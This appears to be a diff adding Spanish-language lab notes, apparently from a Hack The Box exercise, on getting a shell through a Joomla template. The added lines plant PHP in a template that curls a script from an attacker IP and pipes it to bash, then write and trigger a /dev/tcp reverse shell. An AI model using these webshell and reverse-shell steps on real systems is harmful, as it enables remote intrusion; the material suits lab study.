@@ -26,3 +26,16 @@ Podemos obtener una shell siguiendo un proceso parecido al de WP:
 
         
         curl -s http://app.inlanefreight.local/templates/<template>/<pagina>.php?0=id
+### Obteniendo una shell 2:
+
+agregar en una página un código php:
+        <?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>
+
+crear la shell
+        echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+
+iniciar un servidor python y un netcat
+
+Llamar a la páginacon curl:
+
+        curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
